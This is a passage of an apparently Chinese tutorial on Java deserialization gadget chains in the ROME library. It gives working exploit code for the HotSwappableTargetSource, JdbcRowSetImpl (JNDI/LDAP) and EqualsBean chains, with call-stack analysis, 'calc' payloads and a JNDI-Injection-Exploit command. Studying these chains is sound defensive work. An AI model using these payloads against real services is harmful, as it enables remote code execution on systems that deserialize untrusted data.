        <span class="n">ctClass</span><span class="o">.</span><span class="na">makeClassInitializer</span><span class="o">().</span><span class="na">setBody</span><span class="o">(</span><span class="s">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="o">);</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>

        <span class="c1">// 创建TemplatesImpl对象</span>
        <span class="n">Object</span> <span class="n">templateImpl</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">TemplatesImpl</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{}).</span><span class="na">newInstance</span><span class="o">();</span>
        <span class="n">setFiled</span><span class="o">(</span><span class="n">templateImpl</span><span class="o">,</span> <span class="s">"_bytecodes"</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">bytes</span><span class="o">});</span>
        <span class="n">setFiled</span><span class="o">(</span><span class="n">templateImpl</span><span class="o">,</span> <span class="s">"_name"</span><span class="o">,</span> <span class="s">"test"</span><span class="o">);</span>
        <span class="n">setFiled</span><span class="o">(</span><span class="n">templateImpl</span><span class="o">,</span> <span class="s">"_tfactory"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>

        <span class="c1">// 创建HotSwappableTargetSource</span>
        <span class="n">ToStringBean</span> <span class="n">toStringBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ToStringBean</span><span class="o">(</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">templateImpl</span><span class="o">);</span>
        <span class="n">HotSwappableTargetSource</span> <span class="n">targetSource1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HotSwappableTargetSource</span><span class="o">(</span><span class="n">toStringBean</span><span class="o">);</span>
        <span class="n">HotSwappableTargetSource</span> <span class="n">targetSource2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HotSwappableTargetSource</span><span class="o">(</span><span class="k">new</span> <span class="n">XString</span><span class="o">(</span><span class="s">"aaa"</span><span class="o">));</span>

        <span class="c1">// 创建HashMap</span>
        <span class="n">HashMap</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
        <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">targetSource1</span><span class="o">,</span> <span class="s">"111"</span><span class="o">);</span>
        <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">targetSource2</span><span class="o">,</span> <span class="s">"222"</span><span class="o">);</span>


        <span class="c1">// 序列化</span>
        <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"HotSwap.bin"</span><span class="o">));</span>
        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">hashMap</span><span class="o">);</span>
        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>

        <span class="c1">// 反序列化</span>
        <span class="n">ObjectInputStream</span> <span class="n">objectInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">"HotSwap.bin"</span><span class="o">));</span>
        <span class="n">objectInputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="n">objectInputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFiled</span><span class="o">(</span><span class="n">Object</span> <span class="n">o</span><span class="o">,</span> <span class="n">String</span> <span class="n">fieldname</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">o</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldname</span><span class="o">);</span>
        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">o</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<h3 data-content="1" id="0947e81668eeb192aaad97186695a095">函数调用栈</h3>
<div class="highlight"><pre><span></span><span class="nl">getOutputProperties:</span><span class="mi">507</span><span class="o">,</span> <span class="n">TemplatesImpl</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xalan</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">xsltc</span><span class="o">.</span><span class="na">trax</span><span class="o">)</span>
<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">497</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">toString:</span><span class="mi">137</span><span class="o">,</span> <span class="n">ToStringBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">toString:</span><span class="mi">116</span><span class="o">,</span> <span class="n">ToStringBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">equals:</span><span class="mi">392</span><span class="o">,</span> <span class="n">XString</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xpath</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">objects</span><span class="o">)</span>
<span class="nl">equals:</span><span class="mi">104</span><span class="o">,</span> <span class="n">HotSwappableTargetSource</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">aop</span><span class="o">.</span><span class="na">target</span><span class="o">)</span>
<span class="nl">putVal:</span><span class="mi">634</span><span class="o">,</span> <span class="n">HashMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">readObject:</span><span class="mi">1397</span><span class="o">,</span> <span class="n">HashMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">497</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invokeReadObject:</span><span class="mi">1058</span><span class="o">,</span> <span class="n">ObjectStreamClass</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readSerialData:</span><span class="mi">1900</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readOrdinaryObject:</span><span class="mi">1801</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readObject0:</span><span class="mi">1351</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readObject:</span><span class="mi">371</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">main:</span><span class="mi">60</span><span class="o">,</span> <span class="n">HotSwapExp</span> <span class="o">(</span><span class="n">RomeSec</span><span class="o">)</span>
</pre></div>
<h3 data-content="1" id="db4523069e15311fd2e0255de73c3916">详细分析</h3>
<p>这条链的前后不变，中间加入了HotSwappableTargetSource和XString</p>
<p>从HashMap开始，在exp中put了2对键值，在读取完第一套键值后，读取第二套键值时在putVal函数出会触发<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240120124835-2bc735c2-b74f-1.png"/></p>
<p>在putVal函数中会对键作比较，此时传入的参数key就是第二次put进入的key，它会与前面已经存放进入HashMap的key逐个作比较<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240120124855-3779c1fa-b74f-1.png"/></p>
<p>接下来就借助了HotSwappableTargetSource类中的equals方法</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">equals</span><span class="o">(</span><span class="n">Object</span> <span class="n">other</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">return</span> <span class="k">this</span> <span class="o">==</span> <span class="n">other</span> <span class="o">||</span> <span class="n">other</span> <span class="k">instanceof</span> <span class="n">HotSwappableTargetSource</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="o">.</span><span class="na">target</span><span class="o">.</span><span class="na">equals</span><span class="o">(((</span><span class="n">HotSwappableTargetSource</span><span class="o">)</span><span class="n">other</span><span class="o">).</span><span class="na">target</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
<p>从这里可以得到put进入map的两个key都必须为HotSwappableTargetSource对象，第二个是为了能够调用HotSwappableTargetSource的equals方法，另一个是当成参数传递，但由于代码中对传入的参数进行强制的类型转换，所以传入的other也必须要是HotSwappableTargetSource对象</p>
<p>简单而言，这个函数里面的this对应上一个方法的key，即put的第二个key；这里的other对应上一个方法的k，即put的第一个key<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240120124912-41b9c23c-b74f-1.png"/></p>
<p>在equals方法中，会调用target的equals方法，所以这里的target需要设置XString对象<br/>
因为XString对象中存在equals方法，并且需要一个参数，而且还调用了该参数的toString方法<br/>
因此可以得知第二个HotSwappableTargetSource对象的target参数设置成XString对象，而第二个HotSwappableTargetSource对象的target则设置成ToStringBean对象，这样就能够调用XString类的equals方法进而触发ToStringBean的toString方法</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">equals</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj2</span><span class="o">)</span>
  <span class="o">{</span>

    <span class="k">if</span> <span class="o">(</span><span class="kc">null</span> <span class="o">==</span> <span class="n">obj2</span><span class="o">)</span>
      <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>

      <span class="c1">// In order to handle the 'all' semantics of</span>
      <span class="c1">// nodeset comparisons, we always call the</span>
      <span class="c1">// nodeset function.</span>
    <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">obj2</span> <span class="k">instanceof</span> <span class="n">XNodeSet</span><span class="o">)</span>
      <span class="k">return</span> <span class="n">obj2</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
    <span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">obj2</span> <span class="k">instanceof</span> <span class="n">XNumber</span><span class="o">)</span>
        <span class="k">return</span> <span class="n">obj2</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
    <span class="k">else</span>
      <span class="k">return</span> <span class="n">str</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">obj2</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
<span class="o">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240120124932-4d8eaa46-b74f-1.png"/></p>
<p>然后来到了ToStringBean类的toString方法，获取_beanClass的所有get方法并调用，和前面的链一致</p>
<h2 data-content="1" id="dfc30dc0d603541a8c38e6ae538e6bf2">8. JdbcRowSetImpl利用链</h2>
<h3 data-content="1" id="43babefad20384d8aff6da5cd14dd053">利用链</h3>
<div class="highlight"><pre><span></span><span class="n">JdbcRowSetImpl</span><span class="o">.</span><span class="na">connect</span><span class="o">()</span>
<span class="n">JdbcRowSetImpl</span><span class="o">.</span><span class="na">getDatabaseMetaData</span><span class="o">()</span>
<span class="n">ToStringBean</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">String</span><span class="o">)</span>
<span class="n">ToStringBean</span><span class="o">.</span><span class="na">toString</span><span class="o">()</span>
<span class="n">EqualsBean</span><span class="o">.</span><span class="na">beanHashCode</span><span class="o">()</span>
<span class="n">EqualsBean</span><span class="o">.</span><span class="na">hashCode</span><span class="o">()</span>
<span class="n">ObjetBean</span><span class="o">.</span><span class="na">hashCode</span><span class="o">()</span>
<span class="n">HashMap</span><span class="o">&lt;</span><span class="n">K</span><span class="o">,</span><span class="n">V</span><span class="o">&gt;.</span><span class="na">hash</span><span class="o">(</span><span class="n">Object</span><span class="o">)</span>
<span class="n">HashMap</span><span class="o">&lt;</span><span class="n">K</span><span class="o">,</span><span class="n">V</span><span class="o">&gt;.</span><span class="na">readObject</span><span class="o">(</span><span class="n">ObjectInputStream</span><span class="o">)</span>
</pre></div>
<h3 data-content="1" id="b70cb5a0d01e6d7d314dcdf843befdb1">EXP</h3>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">RomeSec</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.sun.rowset.JdbcRowSetImpl</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.syndication.feed.impl.ObjectBean</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.syndication.feed.impl.ToStringBean</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.sql.rowset.BaseRowSet</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">JdbcRowExp</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
        <span class="c1">// ldap url</span>
        <span class="n">String</span> <span class="n">url</span> <span class="o">=</span> <span class="s">"ldap://127.0.0.1:1389/nils4f"</span><span class="o">;</span>

        <span class="c1">// 创建JdbcRowSetImpl对象</span>
        <span class="n">JdbcRowSetImpl</span> <span class="n">jdbcRowSet</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JdbcRowSetImpl</span><span class="o">();</span>
        <span class="n">Field</span> <span class="n">dataSource</span> <span class="o">=</span> <span class="n">BaseRowSet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"dataSource"</span><span class="o">);</span>
        <span class="n">dataSource</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">dataSource</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">jdbcRowSet</span><span class="o">,</span> <span class="n">url</span><span class="o">);</span>

        <span class="c1">// 创建ToStringBean对象</span>
        <span class="n">ToStringBean</span> <span class="n">toStringBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ToStringBean</span><span class="o">(</span><span class="n">JdbcRowSetImpl</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">jdbcRowSet</span><span class="o">);</span>
        <span class="c1">// 创建ObjectBean</span>
        <span class="n">ObjectBean</span> <span class="n">objectBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectBean</span><span class="o">(</span><span class="n">ToStringBean</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">toStringBean</span><span class="o">);</span>

        <span class="c1">// 创建HashMap</span>
        <span class="n">HashMap</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
        <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">objectBean</span><span class="o">,</span> <span class="s">"bbbb"</span><span class="o">);</span>

        <span class="c1">// 序列化</span>
        <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"JdbcRowExp.bin"</span><span class="o">));</span>
        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">hashMap</span><span class="o">);</span>
        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>

        <span class="c1">// 反序列化</span>
        <span class="n">ObjectInputStream</span> <span class="n">objectInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">"JdbcRowExp.bin"</span><span class="o">));</span>
        <span class="n">objectInputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="n">objectInputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<h3 data-content="1" id="e6bec766e5574265db7a1991502ece10">函数调用栈</h3>
<div class="highlight"><pre><span></span><span class="nl">connect:</span><span class="mi">615</span><span class="o">,</span> <span class="n">JdbcRowSetImpl</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">rowset</span><span class="o">)</span>
<span class="nl">getDatabaseMetaData:</span><span class="mi">4004</span><span class="o">,</span> <span class="n">JdbcRowSetImpl</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">rowset</span><span class="o">)</span>
<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">497</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">toString:</span><span class="mi">137</span><span class="o">,</span> <span class="n">ToStringBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">toString:</span><span class="mi">116</span><span class="o">,</span> <span class="n">ToStringBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">beanHashCode:</span><span class="mi">193</span><span class="o">,</span> <span class="n">EqualsBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">hashCode:</span><span class="mi">110</span><span class="o">,</span> <span class="n">ObjectBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">hash:</span><span class="mi">338</span><span class="o">,</span> <span class="n">HashMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">readObject:</span><span class="mi">1397</span><span class="o">,</span> <span class="n">HashMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">497</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invokeReadObject:</span><span class="mi">1058</span><span class="o">,</span> <span class="n">ObjectStreamClass</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readSerialData:</span><span class="mi">1900</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readOrdinaryObject:</span><span class="mi">1801</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readObject0:</span><span class="mi">1351</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readObject:</span><span class="mi">371</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">main:</span><span class="mi">42</span><span class="o">,</span> <span class="n">JdbcRowExp</span> <span class="o">(</span><span class="n">RomeSec</span><span class="o">)</span>
</pre></div>
<h3 data-content="1" id="a024e6b6205ef104fc7a86d3eca99d93">详细分析</h3>
<p>这条链的组合是前半部分不变，修改后半部分，即替换前面的TemplatesImpl为JdbcRowSetImpl，后面的链就会发生变化</p>
<p>同样在ToStringBean的toString方法中，会调用getPropertyDescriptors来获得JdbcRowSetImpl的所有公开的get方法，然后逐个使用invoke调用<br/>
而在JdbcRowSetImpl链中的关键是调用getDatabaseMetaData方法<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240120124955-5b639a46-b74f-1.png"/></p>
<p>在JdbcRowSetImpl的getDatabaseMetaData方法中会调用connect方法</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">DatabaseMetaData</span> <span class="nf">getDatabaseMetaData</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">SQLException</span> <span class="o">{</span>
    <span class="n">Connection</span> <span class="n">var1</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">connect</span><span class="o">();</span>
    <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="na">getMetaData</span><span class="o">();</span>
<span class="o">}</span>
</pre></div>
<p>进入connect方法，会调用lookup函数，所以这里的getDataSourceName的返回值非常关键，需要是可以利用的ldap链接，所以在exp中进行如下设置</p>
<div class="highlight"><pre><span></span><span class="c1">// ldap url</span>
<span class="n">String</span> <span class="n">url</span> <span class="o">=</span> <span class="s">"ldap://127.0.0.1:1389/nils4f"</span><span class="o">;</span>

<span class="c1">// 创建JdbcRowSetImpl对象</span>
<span class="n">JdbcRowSetImpl</span> <span class="n">jdbcRowSet</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JdbcRowSetImpl</span><span class="o">();</span>
<span class="n">Field</span> <span class="n">dataSource</span> <span class="o">=</span> <span class="n">BaseRowSet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"dataSource"</span><span class="o">);</span>
<span class="n">dataSource</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="n">dataSource</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">jdbcRowSet</span><span class="o">,</span> <span class="n">url</span><span class="o">);</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240120125013-662ebb36-b74f-1.png"/></p>
<p>其中LDAP服务可以通过JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar工具开启</p>
<div class="highlight"><pre><span></span>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C calc -A <span class="m">127</span>.0.0.1
</pre></div>
<h2 data-content="1" id="b485a4b880c7650e4c26ae9a3019d355">9. EqualsBean利用链</h2>
<h3 data-content="1" id="4dc17d5026b3e7b826689391275163c4">调用链</h3>
<div class="highlight"><pre><span></span><span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">getOutputProperties</span><span class="o">()</span>
<span class="n">EqualsBean</span><span class="o">.</span><span class="na">beanEquals</span><span class="o">()</span>
<span class="n">EqualsBean</span><span class="o">.</span><span class="na">equals</span><span class="o">()</span>
<span class="n">AbstractMap</span><span class="o">.</span><span class="na">equals</span><span class="o">()</span>
<span class="n">HashMap</span><span class="o">.</span><span class="na">putVal</span><span class="o">()</span>
<span class="n">HashMap</span><span class="o">.</span><span class="na">put</span><span class="o">()</span>
<span class="n">HashSet</span><span class="o">.</span><span class="na">readObject</span><span class="o">()</span>
</pre></div>
<h3 data-content="1" id="0e19f08da7efafc4748d1b5faed03486">EXP</h3>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">RomeSec</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.sun.syndication.feed.impl.EqualsBean</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javassist.CtClass</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.xml.transform.Templates</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashSet</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">EqualsBeanExp</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
        <span class="n">String</span> <span class="n">AbstractTranslet</span><span class="o">=</span><span class="s">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="o">;</span>
